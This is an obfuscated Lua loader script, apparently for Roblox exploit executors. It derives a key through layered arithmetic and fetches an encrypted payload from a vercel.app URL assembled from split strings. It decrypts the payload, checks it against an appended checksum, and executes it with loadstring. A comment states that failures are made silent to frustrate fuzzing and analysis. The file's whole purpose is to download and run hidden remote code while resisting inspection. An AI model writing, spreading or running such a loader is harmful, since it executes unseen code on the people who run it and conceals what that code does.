local k6tm9k=bit32 or bit
local z3xjg2,np4te,m1f0r,lbpbj
if k6tm9k then z3xjg2,np4te,m1f0r,lbpbj=k6tm9k.bxor,k6tm9k.lshift,k6tm9k.rshift,k6tm9k.band
else
local function z357(wo5) return wo5%4294967296 end
z3xjg2=function(wo5,uagq8) local d5x,s_z=0,1 for z7sjc=1,32 do local qsl,qdud7=wo5%2,uagq8%2 if qsl~=qdud7 then d5x=d5x+s_z end wo5=(wo5-qsl)/2 uagq8=(uagq8-qdud7)/2 s_z=s_z*2 end return d5x end
np4te=function(wo5,uagq8) return z357(wo5*2^uagq8) end
m1f0r=function(wo5,uagq8) return math.floor(z357(wo5)/2^uagq8) end
lbpbj=function(wo5,uagq8) local d5x,s_z=0,1 for z7sjc=1,32 do local qsl,qdud7=wo5%2,uagq8%2 if qsl==1 and qdud7==1 then d5x=d5x+s_z end wo5=(wo5-qsl)/2 uagq8=(uagq8-qdud7)/2 s_z=s_z*2 end return d5x end
end
local function tqd(wo5) if wo5==0 then wo5=2654435769 end wo5=z3xjg2(wo5,np4te(wo5,13)) wo5=z3xjg2(wo5,m1f0r(wo5,17)) wo5=z3xjg2(wo5,np4te(wo5,5)) return wo5 end
local ow2x="eb5733b".."871".."add".."da8fc04".."654657".."851bb2"
local jmy=tonumber(ow2x:sub(1,8),16)
local q3qlup=tonumber(ow2x:sub(9,16),16)
if jmy==0 then jmy=2654435769 end
if q3qlup==0 then q3qlup=2242054355 end
local qvz=668265261
jmy=(jmy+(288028841+1129398946))%4294967296
q3qlup=z3xjg2(q3qlup,1417427787)
jmy=(jmy*42269)%4294967296
jmy=(jmy+580813511)%4294967296
q3qlup=z3xjg2(q3qlup,580813511)
jmy=(jmy*49513)%4294967296
jmy=z3xjg2(jmy,ow2x:byte(31))
jmy=(jmy*(14648+4107))%4294967296
jmy=(jmy+(1459023312+137085662))%4294967296
q3qlup=z3xjg2(q3qlup,1596108974)
qvz=(qvz*3+(60199999+2821058546))%4294967296
jmy=(np4te(jmy,26)+m1f0r(jmy,6))%4294967296
jmy,q3qlup=q3qlup,jmy
jmy=(jmy*10841)%4294967296
jmy=(jmy+2557738308)%4294967296
q3qlup=z3xjg2(q3qlup,(430166014+2127572294))
qvz=(qvz*3+(2758429007+217937682))%4294967296
jmy=(np4te(jmy,29)+m1f0r(jmy,3))%4294967296
qvz=(qvz*3+494758295)%4294967296
jmy=tqd(jmy)
q3qlup=tqd(q3qlup)
jmy=(np4te(jmy,3)+m1f0r(jmy,29))%4294967296
jmy=(jmy+779408215)%4294967296
jmy=z3xjg2(jmy,ow2x:byte(32))
jmy=(jmy*34453)%4294967296
qvz=(qvz*3+4058200595)%4294967296
jmy=(jmy+q3qlup)%4294967296
q3qlup=z3xjg2(q3qlup,jmy)
jmy=(np4te(jmy,8)+m1f0r(jmy,24))%4294967296
jmy=tqd(jmy)
q3qlup=tqd(q3qlup)
jmy=(jmy+646987300)%4294967296
jmy,q3qlup=q3qlup,jmy
qvz=(qvz*3+779479493)%4294967296
jmy=(jmy+3118692337)%4294967296
local gp5r=string.format("%08x",jmy)..string.format("%08x",q3qlup)
local pvc="https://lua-script-hosting-api.vercel.app/api/load/".."836".."8af3".."abbb485".."881066a".."547cfd".."c997".."0ae03c4".."f26".."7fcb".."c2899dc".."6b9e08".."936".."8f2"
pvc=pvc.."?n=".."31cc74b".."9ef8a".."15ec".."4d9bc".."cb82".."fb25d70".."248bf".."dcd8b4e7".."68c".."&p="..gp5r
local e3mc
for z7sjc=1,3 do
local s3k0o8,kfhn0=pcall(function() return game:HttpGet(pvc) end)
if s3k0o8 and type(kfhn0)=="string" and #kfhn0>=2 then e3mc=kfhn0 break end
if z7sjc<3 then local j_3j9d=(task and task.wait) or wait if j_3j9d then pcall(j_3j9d,1) end end
end
if not e3mc then return end
local nz0_ul=jmy
local ziokr=q3qlup
if nz0_ul==0 then nz0_ul=2654435769 end
if ziokr==0 then ziokr=2242054355 end
local nkpq,drj={},{}
for n2ww in e3mc:gmatch("%x%x") do
nz0_ul=tqd(nz0_ul)
ziokr=(ziokr+2654435769)%4294967296
local pef=lbpbj(z3xjg2(nz0_ul,m1f0r(ziokr,11)),255)
nkpq[#nkpq+1]=string.char(z3xjg2(tonumber(n2ww,16),pef))
if #nkpq>=4096 then drj[#drj+1]=table.concat(nkpq) nkpq={} end
end
if #drj==0 and #nkpq==0 then return end
if #nkpq>0 then drj[#drj+1]=table.concat(nkpq) end
local lil=table.concat(drj)
-- Integrity gate: the payload ends with "--I:<8hex>", a checksum over
-- everything before it. A wrong key (binary garbage), a truncated
-- capture, or an edited payload all fail here SILENTLY: no error, no
-- output, nothing for a fuzzer to iterate against.
local rcp6v=lil:match("%-%-I:(%x%x%x%x%x%x%x%x)%s*$")
if not rcp6v then return end
lil=lil:gsub("%-%-I:%x%x%x%x%x%x%x%x%s*$","")
local qqslxj=5381
for z7sjc=1,#lil do qqslxj=(qqslxj*33+lil:byte(z7sjc))%4294967296 end
if qqslxj%268435456~=tonumber(rcp6v,16) then return end
local g3fdda=loadstring(lil)
if g3fdda then return g3fdda() end